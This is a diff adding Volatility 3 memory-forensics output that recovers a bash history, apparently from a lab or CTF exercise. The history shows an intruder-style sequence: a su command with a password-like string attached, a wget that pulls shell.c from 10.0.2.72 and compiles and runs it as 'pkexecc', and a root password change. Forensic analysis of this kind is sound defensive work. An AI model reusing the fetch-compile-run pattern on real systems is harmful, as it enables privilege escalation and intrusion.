@@ -1,0 +1,13 @@
+$ /opt/vol3dev/bin/vol -q -f linux.mem linux.bash.Bash 2>/dev/null | head -12
+Volatility 3 Framework 2.28.3
+
+PID	Process	CommandTime	Command
+
+1076	bash	2023-11-07 03:49:45.000000 UTC	su rootFtrccw45PHyq
+1076	bash	2023-11-07 03:49:45.000000 UTC	sqlite3 users.db
+1076	bash	2023-11-07 03:49:45.000000 UTC	@
+1076	bash	2023-11-07 03:49:45.000000 UTC	su root
+1076	bash	2023-11-07 03:50:11.000000 UTC	wget 10.0.2.72/shell.c && gcc shell.c -o pkexecc && rm shell.c
+1076	bash	2023-11-07 03:50:17.000000 UTC	./pkexecc
+1197	bash	2023-11-07 03:51:49.000000 UTC	apt-get install build-essential linux-headers-`uname -r` git python dwarfdump zip -y
+1197	bash	2023-11-07 03:51:49.000000 UTC	passwd root
